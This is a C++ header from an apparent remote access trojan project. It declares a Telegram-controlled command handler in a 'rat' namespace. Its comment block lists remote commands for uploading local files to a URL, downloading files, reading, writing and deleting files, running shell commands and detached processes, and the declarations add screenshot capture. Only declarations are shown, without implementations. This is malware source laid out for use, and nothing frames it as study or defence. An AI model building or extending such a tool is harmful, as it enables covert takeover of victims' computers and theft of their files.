#pragma once
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"
#include <string>
#include <vector>
#include "rat/RatState.hpp"

/* 
 * RAT-like Telegram Bot Command Handler
 *
 * Supported commands:
 *   /download <url> [-o <filepath or dir>]   Download a file using rat::networking
 *   /upload <filepath> <url>                Upload a file (Telegram or generic)
 *   /get <filepath>                          Reads local file
 *   /pwd                                     Returns current working directory
 *   /ls <dir>                                Lists files in directory
 *   /read <filepath>                          Reads file contents
 *   /stat <filepath>                          Returns file information
 *   /touch <filepath>                         Creates empty file
 *   /echo <"text"> > <filepath>              Writes text to file
 *   /rm <filepath>                            Deletes file
 *   /mv <src> <dst>                           Moves file
 *   /cp <src> <dst>                           Copies file
 *   /process <command>                         Runs detached process
 *   /sh <timeout> <command>                    Runs shell command
 *   /set <variable> <value>                    
 */

namespace rat {
struct Command {
    std::string directive;
    std::vector<std::string> parameters;

    Command(const std::string& arg_Directive, const std::vector<std::string>& arg_Parameters)
        : directive(arg_Directive), parameters(arg_Parameters) {}
};


}
namespace rat::tbot::handler {


std::string _handleScreenshotCommand(Bot& arg_Bot);

std::string _parseAndHandleSystemCommand(Bot& arg_Bot, Message& Telegram_Message);

std::string _parseAndHandleShellCommand(Message& Telegram_Message);

std::string _parseAndHandleProcessCommand(Bot& bot, Message& Telegram_Message);

Command _parseTelegramMessageToCommand(const Message& Telegram_Message);


/*ALL of this module does is expose this one function handleUpdate()*/
/* Main entry point for handling updates */

void handleUpdate(rat::RatState& arg_State, Bot& arg_Bot, const Update& arg_Update);

} // namespace rat::tbot::handler


